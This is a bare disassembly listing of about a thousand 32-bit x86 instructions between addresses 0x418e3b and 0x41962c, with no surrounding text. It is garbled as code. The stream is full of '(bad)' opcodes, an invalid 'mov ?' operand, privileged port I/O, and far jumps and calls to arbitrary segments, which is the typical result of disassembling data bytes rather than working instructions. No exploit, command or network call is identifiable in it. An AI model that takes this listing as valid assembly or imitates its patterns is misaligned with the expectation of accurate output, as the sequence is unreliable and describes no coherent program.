  418e3b:	mov    edx,DWORD PTR ss:[ecx]
  418e3e:	adc    bh,BYTE PTR [edi+eax*1-0x55]
  418e42:	test   al,0x57
  418e44:	outs   dx,DWORD PTR ds:[esi]
  418e45:	fwait
  418e46:	dec    esp
  418e47:	mov    WORD PTR [ecx+0x12],es
  418e4a:	in     al,0xf7
  418e4c:	xor    DWORD PTR [esi+0x6c],0x62
  418e50:	xchg   ebp,eax
  418e51:	cdq    
  418e52:	push   ecx
  418e53:	test   BYTE PTR [eax-0x1cfc0944],dh
  418e59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e5a:	mov    bl,0xda
  418e5c:	xor    bh,BYTE PTR [ebp-0x3e]
  418e5f:	repz out dx,eax
  418e61:	fcomp  DWORD PTR [edi]
  418e63:	pop    ecx
  418e64:	push   es
  418e65:	loopne 0x418ee5
  418e67:	mov    edi,edi
  418e69:	add    eax,0x94a12b07
  418e6e:	push   edi
  418e6f:	aam    0x59
  418e71:	dec    ecx
  418e72:	dec    ebp
  418e73:	pop    esi
  418e74:	add    BYTE PTR [edi-0x32],0x5e
  418e78:	stos   BYTE PTR es:[edi],al
  418e79:	stos   DWORD PTR es:[edi],eax
  418e7a:	retf   
  418e7b:	fisttp DWORD PTR [eax+0x164858be]
  418e81:	clc    
  418e82:	push   esp
  418e83:	push   ecx
  418e84:	jle    0x418eb1
  418e86:	std    
  418e87:	pop    eax
  418e88:	pop    ss
  418e89:	pop    ds
  418e8a:	ficom  DWORD PTR [ecx+0x1b]
  418e8d:	cs adc eax,0xd64fe199
  418e93:	test   bh,dh
  418e95:	dec    edx
  418e96:	sbb    ebp,DWORD PTR [ebx+0x6022d491]
  418e9c:	xchg   edx,eax
  418e9d:	retf   
  418e9e:	sbb    eax,0xdfbaecb2
  418ea3:	mov    dh,0xcf
  418ea5:	mul    DWORD PTR es:[ecx+0x52]
  418ea9:	ret    
  418eaa:	and    BYTE PTR [esi],0xfb
  418ead:	inc    ebx
  418eae:	ret    
  418eaf:	fwait
  418eb0:	dec    ebx
  418eb1:	adc    dh,BYTE PTR [ecx+0x9]
  418eb4:	adc    eax,0xec59796a
  418eb9:	(bad)  
  418eba:	jns    0x418f01
  418ebc:	mov    ds:0x92c3a9b0,eax
  418ec1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ec2:	aad    0xeb
  418ec4:	outs   dx,BYTE PTR ds:[esi]
  418ec5:	and    eax,0x2a2c91ca
  418eca:	scas   eax,DWORD PTR es:[edi]
  418ecb:	outs   dx,BYTE PTR ds:[esi]
  418ecc:	shr    BYTE PTR [ebx],1
  418ece:	lds    esp,FWORD PTR [edi-0x3b15ca06]
  418ed4:	jo     0x418f11
  418ed6:	sbb    eax,0x286ebbd9
  418edb:	(bad)  
  418edc:	push   esi
  418edd:	sbb    ecx,DWORD PTR [ebp+0x6ebc9d72]
  418ee3:	mov    edx,0x7938e8eb
  418ee8:	es inc ecx
  418eea:	jb     0x418f06
  418eec:	push   edx
  418eed:	mov    al,ds:0xed90e1ed
  418ef2:	mov    esi,0x9d582195
  418ef7:	xchg   edi,eax
  418ef8:	jecxz  0x418f1f
  418efa:	ja     0x418f59
  418efc:	fiadd  DWORD PTR [ebx+eax*8+0x6b665939]
  418f03:	mov    dl,0x5c
  418f05:	and    eax,0x403231c
  418f0a:	rcl    DWORD PTR cs:[ecx-0x3e2d197b],1
  418f11:	push   es
  418f12:	(bad)  
  418f13:	jle    0x418eb1
  418f15:	fdivrp st(2),st
  418f17:	je     0x418f90
  418f19:	ins    DWORD PTR es:[edi],dx
  418f1a:	sbb    al,0x6a
  418f1c:	rcl    BYTE PTR [edi+0x53],1
  418f1f:	cwde   
  418f20:	popa   
  418f21:	fcom   DWORD PTR [ebx+0x5130100e]
  418f27:	inc    ebp
  418f28:	mov    esi,0xa2829b44
  418f2d:	xor    esp,DWORD PTR [edi-0x1158fee1]
  418f33:	int    0x62
  418f35:	jge    0x418f90
  418f37:	pop    edx
  418f38:	fstp   TBYTE PTR [ebx-0x3b]
  418f3b:	int    0x45
  418f3d:	inc    ecx
  418f3e:	(bad)  
  418f3f:	mov    esi,ebx
  418f41:	cmp    DWORD PTR [eax-0x4c932cb9],ecx
  418f47:	push   ecx
  418f48:	xchg   edx,eax
  418f49:	add    cl,ah
  418f4b:	ss call 0x3e03:0xf9aa5e47
  418f53:	iret   
  418f54:	adc    edi,eax
  418f56:	fcomp  DWORD PTR [ebx]
  418f58:	mov    dl,0x8c
  418f5a:	sub    BYTE PTR [esi+0x169b2721],dl
  418f60:	push   eax
  418f61:	retf   0x69d6
  418f64:	aas    
  418f65:	test   al,0x37
  418f67:	add    al,BYTE PTR [eax+0x5a]
  418f6a:	add    al,0x2d
  418f6c:	js     0x418f54
  418f6e:	adc    ebp,DWORD PTR [ecx]
  418f70:	dec    esp
  418f71:	xchg   edi,eax
  418f72:	sub    ebx,eax
  418f74:	mov    dh,0x8d
  418f76:	ss jle 0x418ef9
  418f79:	xor    esi,eax
  418f7b:	mov    dl,0xa9
  418f7d:	mov    dh,0x44
  418f7f:	(bad)  
  418f80:	(bad)  
  418f81:	and    eax,0xe46e3b41
  418f86:	addr16 iret 
  418f88:	ret    0xb33c
  418f8b:	imul   esp,ebp,0x481afecd
  418f91:	mov    al,0xe6
  418f93:	mov    ebp,0x1671c9
  418f98:	stos   DWORD PTR es:[edi],eax
  418f99:	ss retfw 0x80eb
  418f9e:	adc    al,0x23
  418fa0:	icebp  
  418fa1:	jbe    0x418f9e
  418fa3:	mov    cl,0xdd
  418fa5:	repnz push ecx
  418fa7:	test   dl,cl
  418fa9:	lea    esp,[ebx+0x59]
  418fac:	mov    WORD PTR [esi],fs
  418fae:	push   cs
  418faf:	jge    0x418f95
  418fb1:	add    dh,dl
  418fb3:	add    cl,bh
  418fb5:	outs   dx,BYTE PTR ds:[esi]
  418fb6:	(bad)  
  418fb7:	mov    ecx,DWORD PTR [ecx]
  418fb9:	mov    eax,ds:0x43c8ba02
  418fbe:	add    esp,DWORD PTR [edi-0x45]
  418fc1:	add    al,BYTE PTR [ecx]
  418fc3:	sbb    BYTE PTR [esi-0x96a8dcd],cl
  418fc9:	sahf   
  418fca:	mov    eax,0x46e33939
  418fcf:	jno    0x41901c
  418fd1:	jo     0x418fda
  418fd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fd4:	ss cli 
  418fd6:	cld    
  418fd7:	sub    BYTE PTR [ecx],bh
  418fd9:	(bad)  
  418fda:	out    0x6e,eax
  418fdc:	mov    ah,0x87
  418fde:	ret    0xabf4
  418fe1:	ret    
  418fe2:	mov    cl,0xce
  418fe4:	adc    DWORD PTR [ebx],ecx
  418fe6:	scas   al,BYTE PTR es:[edi]
  418fe7:	inc    ecx
  418fe8:	in     eax,0xa3
  418fea:	push   edi
  418feb:	pop    ebx
  418fec:	int3   
  418fed:	pop    edx
  418fee:	push   edx
  418fef:	pop    ebp
  418ff0:	pop    eax
  418ff1:	or     al,0x54
  418ff3:	mov    ah,0x8c
  418ff5:	pushf  
  418ff6:	icebp  
  418ff7:	sbb    dh,0xf7
  418ffa:	jl     0x419048
  418ffc:	xchg   edx,eax
  418ffd:	and    eax,edi
  418fff:	fwait
  419000:	fs (bad) 
  419002:	jmp    0x55ca:0x3b876987
  419009:	adc    bh,BYTE PTR [eax-0x78ed9a89]
  41900f:	fistp  WORD PTR [ebp+0x4276287c]
  419015:	mov    ds:0x2c179a4b,al
  41901a:	hlt    
  41901b:	es xchg edi,eax
  41901d:	outs   dx,DWORD PTR ds:[esi]
  41901e:	in     al,dx
  41901f:	mov    dh,BYTE PTR [ecx+0x4a75fe17]
  419025:	xor    ecx,eax
  419027:	outs   dx,DWORD PTR ds:[esi]
  419028:	mov    al,ds:0x755a7473
  41902d:	xor    eax,0xb4be7b4f
  419032:	or     BYTE PTR [ecx],0x9a
  419035:	xchg   ebx,eax
  419036:	adc    bl,BYTE PTR [edx+0x66]
  419039:	add    BYTE PTR [ebp+0x5b],ah
  41903c:	fucomp st(1)
  41903e:	sahf   
  41903f:	push   0xc4038ab
  419044:	in     eax,0xae
  419046:	or     eax,0x663815f3
  41904b:	std    
  41904c:	stos   BYTE PTR es:[edi],al
  41904d:	or     DWORD PTR [ebx-0x5f3f1039],0x11
  419054:	mov    eax,0xc91c0e97
  419059:	adc    bh,BYTE PTR [eax-0x74]
  41905c:	mov    al,0x9
  41905e:	(bad)  
  41905f:	ins    DWORD PTR es:[edi],dx
  419060:	in     eax,0xea
  419062:	mov    ebx,0x8e1419ff
  419067:	(bad)  
  419068:	fadd   DWORD PTR [ebx-0x34caa0b1]
  41906e:	push   edx
  41906f:	xchg   ebx,eax
  419070:	cmp    DWORD PTR [ecx],esp
  419072:	test   eax,0x12674842
  419077:	or     al,0x3a
  419079:	iret   
  41907a:	hlt    
  41907b:	push   edi
  41907c:	jl     0x419064
  41907e:	push   eax
  41907f:	jle    0x4190be
  419081:	mov    ecx,0xb67ee436
  419086:	xchg   ebx,eax
  419087:	adc    al,BYTE PTR [eax]
  419089:	mov    ?,WORD PTR [ebp-0x5432aa6c]
  41908f:	fidivr DWORD PTR [eax-0x6dca4846]
  419095:	pop    ecx
  419096:	loop   0x4190a3
  419098:	push   0x7375d56b
  41909d:	inc    ebx
  41909e:	cmc    
  41909f:	popa   
  4190a0:	inc    edx
  4190a1:	and    eax,0x735d2ab0
  4190a6:	jne    0x41907a
  4190a8:	xchg   ebp,eax
  4190a9:	jb     0x419112
  4190ab:	jnp    0x419118
  4190ad:	cmc    
  4190ae:	cmp    BYTE PTR [edi+edi*2-0x7061a226],dl
  4190b5:	adc    WORD PTR [ebx-0x2eab8722],si
  4190bc:	fs push ecx
  4190be:	xor    esp,DWORD PTR [ecx+edi*4]
  4190c1:	outs   dx,BYTE PTR ds:[esi]
  4190c2:	hlt    
  4190c3:	jmp    0x419117
  4190c5:	adc    BYTE PTR [esi],dh
  4190c7:	cmp    eax,0xe02901a
  4190cc:	push   ebx
  4190cd:	gs ss cmp eax,0xdc529cbb
  4190d4:	jo     0xea48dd2e
  4190da:	mov    ds:0x133a8d3d,al
  4190df:	xor    BYTE PTR [ecx],ch
  4190e1:	enter  0xdddd,0xc9
  4190e5:	test   al,0xb
  4190e7:	(bad)  
  4190e8:	adc    eax,0xc19bf5a9
  4190ed:	jnp    0x419167
  4190ef:	inc    esi
  4190f0:	pop    edi
  4190f1:	sub    DWORD PTR [esi-0x55],eax
  4190f4:	xor    BYTE PTR [ebp+0x236672ff],ah
  4190fa:	mov    ebx,0xc80a926e
  4190ff:	test   DWORD PTR [ecx-0x4d329f11],ebx
  419105:	jl     0x41915c
  419107:	pop    dx
  419109:	add    eax,0xd2244ac7
  41910e:	inc    edx
  41910f:	xchg   esp,eax
  419110:	dec    ebp
  419111:	sahf   
  419112:	cmc    
  419113:	fistp  WORD PTR [edx]
  419115:	xor    edx,DWORD PTR [esi+0x68]
  419118:	ret    0x79cf
  41911b:	mov    edx,0x5102b39a
  419120:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419121:	pop    edx
  419122:	stos   DWORD PTR es:[edi],eax
  419123:	jmp    0xc307:0x9dfe2932
  41912a:	test   esp,eax
  41912c:	xor    DWORD PTR [edi],esp
  41912e:	shr    edi,0xb2
  419131:	fisubr WORD PTR ds:0x1df188c3
  419137:	mov    dl,0x41
  419139:	dec    esi
  41913a:	dec    edi
  41913b:	xchg   edi,eax
  41913c:	mov    ebx,0x8a6d5151
  419141:	push   ebx
  419142:	fdivr  QWORD PTR [esi-0x3b]
  419145:	out    dx,al
  419146:	lods   al,BYTE PTR ds:[esi]
  419147:	sbb    al,0x3d
  419149:	mov    ah,0xf2
  41914b:	add    BYTE PTR [ecx],ah
  41914d:	jl     0x4190d5
  41914f:	aaa    
  419150:	pop    edx
  419152:	jp     0x41917e
  419154:	in     al,dx
  419155:	cmp    al,0x78
  419157:	cmc    
  419158:	ret    
  419159:	xor    al,0x3b
  41915b:	and    DWORD PTR [edi+0x5d],0x3224b836
  419162:	jns    0x4191ca
  419164:	(bad)  
  419165:	or     DWORD PTR es:0xc5c7cb4e,esi
  41916c:	scas   eax,DWORD PTR es:[edi]
  41916d:	adc    BYTE PTR [ecx-0x6d],bh
  419170:	or     ecx,eax
  419172:	dec    eax
  419173:	xchg   edi,eax
  419174:	push   es
  419175:	imul   ebx,DWORD PTR [edx-0x56],0xd114044
  41917c:	das    
  41917d:	xlat   BYTE PTR ds:[ebx]
  41917e:	fimul  DWORD PTR [edi]
  419180:	sub    eax,0xf9cc837c
  419185:	out    0x8e,eax
  419187:	imul   ebp,DWORD PTR [edi],0xffffffb3
  41918a:	mov    DWORD PTR [esi+0x64],ecx
  41918d:	push   esi
  41918e:	dec    eax
  41918f:	(bad)  
  419190:	aad    0xbc
  419192:	fisttp QWORD PTR [eax-0x38561d96]
  419198:	aam    0xe6
  41919a:	jno    0x419195
  41919c:	int3   
  41919d:	fist   DWORD PTR [eax+0x5a]
  4191a0:	(bad)  
  4191a1:	mov    eax,0x65bae955
  4191a6:	jae    0x4191c1
  4191a8:	std    
  4191a9:	xor    BYTE PTR [ebx+0x395861d2],dl
  4191af:	daa    
  4191b0:	mov    bh,0x13
  4191b2:	xor    ch,BYTE PTR [eax+ebx*2-0x2175be85]
  4191b9:	and    al,0xb4
  4191bb:	call   0xbcdb:0x38e41e2b
  4191c2:	js     0x419194
  4191c4:	pop    ds
  4191c5:	or     al,0x70
  4191c7:	sub    al,0xc5
  4191c9:	adc    bl,BYTE PTR [eax]
  4191cb:	jecxz  0x419190
  4191cd:	pop    es
  4191ce:	push   ecx
  4191cf:	mov    edx,0x62c5fd85
  4191d4:	scas   eax,DWORD PTR es:[edi]
  4191d5:	sub    esi,DWORD PTR [edx]
  4191d7:	mov    al,0x17
  4191d9:	or     eax,0x9a35df3e
  4191de:	dec    ebp
  4191df:	or     BYTE PTR ds:0xfed823cf,0x0
  4191e6:	jmp    0x5ef6:0x73c8cf8
  4191ed:	gs cld 
  4191ef:	data16 jne 0x41926c
  4191f2:	jl     0x419174
  4191f4:	cwde   
  4191f5:	sar    BYTE PTR [ebx+ebp*4+0x6ed6349f],cl
  4191fc:	sbb    ch,bl
  4191fe:	enter  0x79cf,0xe8
  419202:	jbe    0x419236
  419204:	in     eax,0x98
  419206:	or     al,BYTE PTR [esi-0x70]
  419209:	retf   0x91f5
  41920c:	mov    cl,0x28
  41920e:	push   esp
  41920f:	and    eax,0xbc5b4c7a
  419214:	fistp  QWORD PTR [ebx]
  419216:	mov    edi,0xabd8b72d
  41921b:	out    0x75,al
  41921d:	loopne 0x419290
  41921f:	sub    al,0xfd
  419221:	shr    DWORD PTR [eax+0x63e2ca07],cl
  419227:	pop    ebp
  419229:	in     al,dx
  41922a:	out    0xc9,eax
  41922c:	aas    
  41922d:	dec    esi
  41922e:	cmc    
  41922f:	hlt    
  419230:	sti    
  419231:	push   esp
  419232:	sbb    DWORD PTR [esi-0x78d1866a],ebp
  419238:	push   0xffffffaa
  41923a:	add    al,0x3
  41923c:	mov    edi,cs
  41923e:	add    ebp,edi
  419240:	arpl   WORD PTR ds:0xb7f074c2,dx
  419246:	leave  
  419247:	lods   al,BYTE PTR ds:[esi]
  419248:	out    0xae,al
  41924a:	mov    ds:0x3d8e3e69,eax
  41924f:	jmp    0xd198:0x88434c0f
  419256:	pop    esp
  419257:	and    ah,bh
  419259:	or     al,0xad
  41925b:	scas   al,BYTE PTR es:[edi]
  41925c:	and    esp,DWORD PTR [edi-0x5a530344]
  419262:	repz int3 
  419264:	mov    cl,0x2c
  419266:	mov    al,cl
  419268:	mov    edi,0xa69221a3
  41926d:	xor    eax,0xa1f52a1b
  419272:	cmp    eax,edx
  419274:	jae    0x4192af
  419276:	mov    esp,0x8a86b162
  41927b:	mov    ebp,0xb54ad3a5
  419280:	into   
  419281:	test   al,0x23
  419283:	xchg   ebx,eax
  419284:	add    DWORD PTR [edx-0x7c],eax
  419287:	pusha  
  419288:	xor    ch,BYTE PTR [ecx+ebp*1-0x3e]
  41928c:	sub    al,0x13
  41928e:	call   0xf237b77a
  419293:	jnp    0x4192e6
  419295:	mov    cl,0x23
  419297:	pop    esi
  419298:	leave  
  419299:	imul   esp,DWORD PTR [edi-0x3bc08310],0xb8cabc66
  4192a3:	and    ebx,ecx
  4192a5:	add    DWORD PTR [ecx+0x59],esi
  4192a8:	xchg   esp,eax
  4192a9:	fdiv   st(4),st
  4192ab:	xor    ecx,DWORD PTR [eax+0x3ab5799d]
  4192b1:	dec    edi
  4192b2:	hlt    
  4192b3:	lds    ebx,FWORD PTR [edi+esi*2]
  4192b6:	mov    ebp,0xdf84e5df
  4192bb:	aad    0xb6
  4192bd:	jg     0x4192ad
  4192bf:	inc    ebx
  4192c0:	jg     0x41927c
  4192c2:	js     0x4192d7
  4192c4:	pop    ebp
  4192c5:	push   esi
  4192c6:	sub    DWORD PTR [eax+0x55],esp
  4192c9:	out    dx,al
  4192ca:	mov    ecx,0x553b191a
  4192cf:	push   esi
  4192d0:	inc    edx
  4192d1:	fnstsw ax
  4192d3:	adc    DWORD PTR [edi-0x3c],esp
  4192d6:	loop   0x4192ee
  4192d8:	sub    eax,0x9d453ec5
  4192dd:	mov    bh,0x64
  4192df:	pop    ds
  4192e0:	cmp    bl,BYTE PTR [ecx-0x5a0ce5e5]
  4192e6:	cmp    DWORD PTR [esi],ebx
  4192e8:	mov    ah,0x10
  4192ea:	pop    ecx
  4192eb:	(bad)  
  4192ec:	jp     0x419337
  4192ee:	pop    edi
  4192ef:	sbb    dl,BYTE PTR [ecx+ebx*2-0x2dc35bf]
  4192f6:	ret    0x7a5a
  4192f9:	cmp    DWORD PTR ds:0xd770f94d,esp
  4192ff:	sub    cl,BYTE PTR [edi-0x77]
  419302:	in     al,dx
  419303:	dec    esi
  419304:	push   es
  419305:	js     0x419349
  419307:	jne    0x41928d
  419309:	cwde   
  41930a:	pop    ebx
  41930b:	test   al,0xa3
  41930d:	leave  
  41930e:	nop
  41930f:	mov    ch,0x27
  419311:	iret   
  419312:	test   eax,0x8a914d94
  419317:	and    BYTE PTR [ebx+0x74],dh
  41931a:	push   edx
  41931b:	or     esi,DWORD PTR [esi+0x2d]
  41931e:	test   al,0x73
  419320:	adc    ebp,DWORD PTR [ecx+0x2d11c064]
  419326:	out    dx,eax
  419327:	rcr    esi,cl
  419329:	stc    
  41932a:	(bad)  
  41932b:	(bad)  
  41932c:	sbb    DWORD PTR [ebx],ebx
  41932e:	adc    eax,0xd9f0bafd
  419333:	adc    cl,BYTE PTR [ebp-0x1dcf236]
  419339:	ror    BYTE PTR [eax+0x44],1
  41933c:	xor    DWORD PTR [eax+0x15350920],0xf3f5d65f
  419346:	in     eax,dx
  419347:	cwde   
  419348:	lds    esp,FWORD PTR [ebp-0x1]
  41934b:	stos   BYTE PTR es:[edi],al
  41934c:	sub    eax,0x6ed6287b
  419351:	jae    0x419371
  419353:	sub    al,0x4e
  419355:	push   ebx
  419356:	ds mov ah,0xd4
  419359:	mov    ebx,0xadf97861
  41935e:	pop    esi
  41935f:	test   al,0x3d
  419361:	jg     0x41937b
  419363:	mov    esp,0x7d9f8bac
  419368:	dec    esi
  419369:	or     esp,0xffffffb8
  41936c:	gs dec esi
  41936e:	dec    ecx
  41936f:	sub    ah,BYTE PTR [ecx+0x32]
  419372:	popa   
  419373:	lahf   
  419374:	cmp    ebx,edi
  419376:	iret   
  419377:	rol    esp,0x62
  41937a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41937b:	fidiv  DWORD PTR [ebx+0x18deb8ed]
  419381:	adc    eax,0xe24fc3cb
  419386:	not    DWORD PTR [edx+0x7f6b9388]
  41938c:	or     BYTE PTR [esi+0x19],dh
  41938f:	push   ebp
  419390:	data16 mov al,gs:0x82f9eaba
  419397:	jo     0x419336
  419399:	dec    esi
  41939a:	inc    esp
  41939b:	sar    DWORD PTR ds:0xfa398840,0x5
  4193a2:	loop   0x419330
  4193a4:	in     eax,dx
  4193a5:	sub    ebp,DWORD PTR gs:[edx+ebp*8+0x15]
  4193aa:	jo     0x419343
  4193ac:	cmp    eax,DWORD PTR [ecx+0x7c1e462c]
  4193b2:	std    
  4193b3:	adc    DWORD PTR [esp+eiz*4-0x2f],edi
  4193b7:	mov    ch,0x33
  4193b9:	in     eax,dx
  4193ba:	mov    ebx,0x6681af73
  4193bf:	rcl    DWORD PTR ds:0x6572159,1
  4193c5:	jp     0x41940c
  4193c7:	jmp    DWORD PTR [ecx-0x60]
  4193ca:	cmp    eax,0xe96dc4f8
  4193cf:	xlat   BYTE PTR ds:[ebx]
  4193d0:	push   esp
  4193d1:	fs retf 0xce04
  4193d5:	mov    edi,0xebf3632c
  4193da:	inc    edx
  4193db:	push   edi
  4193dc:	xchg   edx,eax
  4193dd:	cwde   
  4193de:	iret   
  4193df:	inc    esp
  4193e0:	jo     0x41940c
  4193e2:	lock cmc 
  4193e4:	cmp    ebp,ebx
  4193e6:	test   al,0x0
  4193e8:	push   edi
  4193e9:	nop
  4193ea:	out    0x21,eax
  4193ec:	mov    WORD PTR [esi+0x6b229f80],fs
  4193f2:	add    eax,esp
  4193f4:	xor    DWORD PTR [eax-0x67abcc1],ebx
  4193fa:	rcr    DWORD PTR [edi+0x63],1
  4193fd:	fldcw  WORD PTR [edi]
  4193ff:	add    DWORD PTR [ebx],ebx
  419401:	call   0x82b2d7d
  419406:	mov    dh,0x8e
  419408:	cs inc esi
  41940a:	in     al,dx
  41940b:	stos   BYTE PTR es:[edi],al
  41940c:	xchg   esi,eax
  41940d:	xor    eax,0x9400f729
  419412:	cmp    esi,DWORD PTR [ecx-0x50]
  419415:	(bad)  
  419416:	cmp    esp,DWORD PTR [edi+0x2fe37749]
  41941c:	test   al,0x1f
  41941e:	add    DWORD PTR [ecx],0xedb327c0
  419424:	scas   eax,DWORD PTR es:[edi]
  419425:	stos   BYTE PTR es:[edi],al
  419426:	pop    ecx
  419427:	mov    cs,esp
  419429:	in     al,0x2e
  41942b:	clc    
  41942c:	push   ss
  41942d:	xor    cl,ch
  41942f:	push   edi
  419430:	repnz aam 0x0
  419433:	out    dx,al
  419434:	ror    BYTE PTR [eax-0x3f],cl
  419437:	sbb    bh,0x75
  41943a:	rol    bl,1
  41943c:	sbb    al,0xb8
  41943e:	call   0xd2c63c46
  419443:	(bad)  
  419444:	pop    esi
  419445:	cmp    al,0xee
  419447:	(bad)  
  419448:	int    0x42
  41944a:	xchg   esp,eax
  41944b:	imul   ebx,DWORD PTR [ecx],0xffffffa2
  41944e:	xor    ah,BYTE PTR [edi]
  419450:	cdq    
  419451:	sub    esi,DWORD PTR [edi+0x38]
  419454:	js     0x4193fb
  419456:	sub    al,0xad
  419458:	pop    es
  419459:	jge    0x41947f
  41945b:	jbe    0x4194db
  41945d:	adc    dh,BYTE PTR [esi-0x76fa3f60]
  419463:	jae    0x4193f2
  419465:	inc    ebx
  419466:	pop    eax
  419467:	or     ebp,DWORD PTR [ebp+0x262534dc]
  41946d:	and    al,0x1d
  41946f:	lahf   
  419470:	call   0xfd7b323c
  419475:	xor    ah,BYTE PTR [edi]
  419477:	jmp    0x806f:0x93dd2ad5
  41947e:	sbb    eax,0xfe4a9706
  419483:	inc    ecx
  419484:	int    0x92
  419486:	cmp    edi,0x53969903
  41948c:	cwde   
  41948d:	(bad)  
  41948e:	jmp    0x4194fb
  419490:	mov    eax,ds:0x4f2d7203
  419495:	add    eax,0x417cc55b
  41949a:	push   ebp
  41949b:	mov    eax,0x662022cf
  4194a0:	pop    ebx
  4194a1:	(bad)  
  4194a2:	sbb    dh,BYTE PTR [esi]
  4194a4:	cdq    
  4194a5:	ficom  DWORD PTR [edi-0x3d64ef7d]
  4194ab:	fstp   QWORD PTR [edx+0x41a60ed7]
  4194b1:	inc    edx
  4194b2:	call   DWORD PTR [ecx]
  4194b4:	test   edx,ebp
  4194b6:	inc    eax
  4194b7:	ret    
  4194b8:	addr16 xor al,0xbc
  4194bb:	std    
  4194bc:	mov    bl,0x4d
  4194be:	mov    eax,ds:0x60a6b798
  4194c3:	daa    
  4194c4:	aad    0x6d
  4194c6:	xor    al,0x3f
  4194c8:	mov    al,0xc9
  4194ca:	push   ebx
  4194cb:	rep ins BYTE PTR es:[edi],dx
  4194cd:	adc    edx,edx
  4194cf:	aas    
  4194d0:	pop    es
  4194d1:	mov    ebx,0xc89ca2f8
  4194d6:	test   al,0x1a
  4194d8:	xor    eax,0x3db6c155
  4194dd:	xchg   ecx,eax
  4194de:	adc    BYTE PTR [edx+0x3d081795],ch
  4194e4:	fsubrp st(1),st
  4194e6:	aas    
  4194e7:	mov    cl,0x88
  4194e9:	pop    ebx
  4194ea:	loopne 0x41952b
  4194ec:	retf   
  4194ed:	ret    
  4194ee:	jle    0x41953b
  4194f0:	xor    cl,0x83
  4194f3:	into   
  4194f4:	dec    ecx
  4194f5:	sbb    eax,0x4c
  4194f8:	mul    BYTE PTR [esp+edi*1]
  4194fb:	test   al,0x3c
  4194fd:	sub    dh,BYTE PTR [eax]
  4194ff:	pushf  
  419500:	hlt    
  419501:	pushf  
  419502:	adc    dh,BYTE PTR [ebx]
  419504:	inc    esi
  419505:	mov    ds,esi
  419507:	bound  ecx,QWORD PTR [edi]
  419509:	icebp  
  41950a:	scas   eax,DWORD PTR es:[edi]
  41950b:	xchg   ebp,eax
  41950c:	cmc    
  41950d:	jae    0x419573
  41950f:	jmp    0x6c8d:0xd1f9f836
  419516:	push   ebp
  419517:	test   DWORD PTR [eax+0x272d98fc],esi
  41951d:	xchg   edx,eax
  41951e:	and    al,0x35
  419520:	mov    WORD PTR [eax-0x10],gs
  419523:	inc    ecx
  419524:	and    al,0xab
  419526:	imul   ebx,DWORD PTR [edx],0x66995b6e
  41952c:	mov    DWORD PTR [ebx-0x5c53adf4],edx
  419532:	cmp    eax,0xc9e4d925
  419537:	dec    esp
  419538:	repz ret 
  41953a:	jge    0x4194ea
  41953c:	pop    ecx
  41953d:	fnsave [ecx-0x3f]
  419540:	fldcw  WORD PTR [edx]
  419542:	pop    edi
  419543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419544:	in     al,dx
  419545:	jl     0x4195a6
  419547:	mov    edx,DWORD PTR [esi+0x37473bd8]
  41954d:	(bad)  
  41954e:	icebp  
  41954f:	lock adc ecx,ebp
  419552:	ret    
  419553:	jne    0x419597
  419555:	pop    ebx
  419556:	cmp    bl,BYTE PTR [ebx-0x49258538]
  41955c:	mov    esp,0xa13602d7
  419561:	cli    
  419562:	imul   ecx,DWORD PTR [edi+0x47a1c6b3],0xa
  419569:	mul    BYTE PTR [ecx+0x8]
  41956c:	aas    
  41956d:	or     al,0x4d
  41956f:	mov    eax,ds:0xd553e738
  419574:	xchg   edx,eax
  419575:	adc    eax,0x21e2caa1
  41957a:	or     dl,0x4
  41957d:	inc    eax
  41957e:	imul   ebp,DWORD PTR [edi-0x117e63c4],0x22
  419585:	pushf  
  419586:	push   ecx
  419587:	rcl    DWORD PTR [ebp-0x17],0x24
  41958b:	mov    al,ds:0x95b147e7
  419590:	push   edx
  419591:	push   es
  419592:	leave  
  419593:	loop   0x419600
  419595:	clc    
  419596:	jecxz  0x4195aa
  419598:	mov    cl,BYTE PTR [ebx+0x45]
  41959b:	or     dl,BYTE PTR [ebx-0x12]
  41959e:	xchg   esi,eax
  41959f:	rcr    DWORD PTR [ebx-0x27],cl
  4195a2:	cmp    DWORD PTR [ebp+0x4f],ebx
  4195a5:	js     0x41960a
  4195a7:	jo     0x4195f6
  4195a9:	nop
  4195aa:	jle    0x419607
  4195ac:	dec    ecx
  4195ad:	cmc    
  4195ae:	mov    esi,0xbd4d2339
  4195b3:	rcr    eax,0xfa
  4195b6:	add    al,0x38
  4195b8:	mov    edi,0x4ab5855c
  4195bd:	inc    edi
  4195be:	lods   eax,DWORD PTR ds:[esi]
  4195bf:	out    dx,eax
  4195c0:	mov    ch,0x44
  4195c2:	std    
  4195c3:	mov    al,0x5d
  4195c5:	ds mov ecx,0x6cd9b95a
  4195cb:	scas   al,BYTE PTR es:[edi]
  4195cc:	imul   eax,ecx,0xd6553ae7
  4195d2:	add    al,0x49
  4195d4:	jbe    0x4195fd
  4195d6:	adc    al,0x18
  4195d8:	dec    eax
  4195d9:	jno    0x419595
  4195db:	mov    ah,0x58
  4195de:	das    
  4195df:	inc    edi
  4195e0:	and    al,0xba
  4195e2:	stos   DWORD PTR es:[edi],eax
  4195e3:	fnstsw WORD PTR [eax+0x6a]
  4195e6:	retf   
  4195e7:	pop    DWORD PTR [eax+0x49]
  4195ea:	xor    BYTE PTR [eax],al
  4195ec:	inc    ebp
  4195ed:	shl    esi,cl
  4195ef:	pop    es
  4195f0:	std    
  4195f1:	ja     0x419609
  4195f3:	lods   al,BYTE PTR ds:[esi]
  4195f4:	adc    eax,0xc1a50f06
  4195f9:	and    esi,DWORD PTR [ecx-0x5eed4217]
  4195ff:	sub    BYTE PTR [edi],dh
  419601:	sbb    DWORD PTR [ecx-0x7a8b314e],edi
  419607:	xchg   BYTE PTR [ebx-0x28],dh
  41960a:	and    ah,0xa6
  41960d:	pop    ds
  41960e:	daa    
  41960f:	pushf  
  419610:	xchg   ecx,eax
  419611:	je     0x41962a
  419613:	imul   ebp,DWORD PTR [esi+0x15]
  419617:	enter  0xb710,0x15
  41961b:	or     eax,0xa54b4a66
  419620:	mov    BYTE PTR [edi],dl
  419622:	adc    cl,BYTE PTR [ebx-0x2c]
  419625:	xor    al,0x1a
  419627:	stos   BYTE PTR es:[edi],al
  419628:	or     BYTE PTR [eax+0x38],cl
  41962b:	(bad)  
  41962c:	pop    ss
